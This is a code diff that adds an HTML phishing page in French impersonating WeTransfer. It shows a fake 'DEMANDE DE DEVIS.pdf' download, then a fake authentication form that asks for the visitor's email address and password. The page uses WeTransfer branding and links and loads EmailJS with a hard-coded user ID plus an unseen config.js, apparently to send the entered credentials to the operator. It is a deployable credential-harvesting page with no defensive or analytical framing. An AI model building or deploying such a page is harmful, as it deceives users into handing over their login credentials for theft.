@@ -1,0 +1,87 @@
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://nouveau3948.web.app/imgwe.png" rel="shortcut icon" type="image/x-icon">
+    <title>WeTransfer | Envoyez des fichiers volumineux rapidement - Jusqu’à 2 Go gratuits</title>
+    
+    <!-- Lien vers le fichier CSS externe -->
+    <link rel="stylesheet" href="style.css">
+    
+    <!-- Lien vers les icônes -->
+    <link rel="stylesheet" href="https://nouveau3948.web.app/all.min.css">
+
+    <!-- Script EmailJS -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+      emailjs.init("zJJeu9ntCPJIpFbm9");  // Ton User ID
+    </script>
+</head>
+<body>
+    <!-- Landing page avec logo PDF et bouton de téléchargement -->
+    <div class="container" id="landing-container">
+        <img src="https://nouveau3948.web.app/337946.png" alt="PDF Logo">
+        <p class="file-name">DEMANDE DE DEVIS.pdf</p>
+        <p class="gray-text">Taille du fichier : 4 Ko</p>
+
+        <script src="https://kit.fontawesome.com/YOUR_KIT_CODE.js" crossorigin="anonymous"></script>
+        <p>📅Date d'expiration : 3 jours.</p>
+        <button class="btn-download" onclick="showLoader()">Télécharger</button>
+        <p><a href="https://wetransfer.com/" target="_blank">www.wetransfer.com</a></p>
+        <p><a>© 2025 WeTransfer</a></p>
+    </div>
+
+    <!-- Timer avant l'affichage du PDF -->
+    <div id="timer">
+        <p class="text-xl font-bold text-gray-700">Le document PDF sera téléchargé dans <span id="countdown">3</span> secondes...</p>
+        <div class="loader"></div>
+    </div>
+
+    <!-- Loader qui apparaît après le clic -->
+    <div id="loader">
+        <p class="text-xl font-bold text-gray-700"></p>
+        <div class="loader"></div>
+    </div>
+
+    <!-- Formulaire qui apparaît après le délai -->
+    <div class="form-container" id="form-container">
+        <div>
+            <h2>Bienvenue</h2>
+            <img width="250" height="150" src="https://images.seeklogo.com/logo-png/29/1/wetransfer-logo-png_seeklogo-299119.png">
+            <h5>Commencez à recevoir votre fichier sécurisé par WeTransfer.</h5>
+            <p class="mt-2 text-center text-sm text-gray-600">Authentification requise</p>
+            <p class="mt-2 text-center text-sm text-gray-600">
+                <strong>Merci de vous connecter avec votre adresse e-mail pour accéder au document.</strong>
+            </p>
+        </div>
+        <div class="input-container">
+            <i class="fas fa-envelope icon"></i>
+            <input type="email" id="zone-email" placeholder="Adresse Email" required="">
+            <div id="erreur-email" class="error hidden"></div>
+        </div>
+        <div id="affiche-mdp" class="hidden">
+            <div class="input-container">
+                <i class="fas fa-lock icon"></i>
+                <input type="password" id="zone-password" placeholder="Mot de passe" required="">
+                <div id="erreur-mdp" class="error hidden"></div>
+            </div>
+        </div>
+        <button class="btn" id="continuer-button">Continuer</button>
+
+        <div class="mt-2 text-sm text-center text-gray-500">
+            <p><a href="https://wetransfer.com" target="_blank">www.wetransfer.com</a></p>
+            <p><a>©2025 Wetransfer</a></p>
+            <footer>
+                <p>Suivez-nous :</p>
+                <a href="https://www.facebook.com/wetransfer" target="_blank">Facebook</a> |
+                <a href="https://twitter.com/WeTransfer" target="_blank">Twitter</a> |
+                <a href="https://www.instagram.com/wetransfer" target="_blank">Instagram</a>
+            </footer>
+        </div>
+    </div>
+
+    <!-- Lien vers le fichier JavaScript externe -->
+    <script src="config.js"></script>
+
+</body>
+</html>
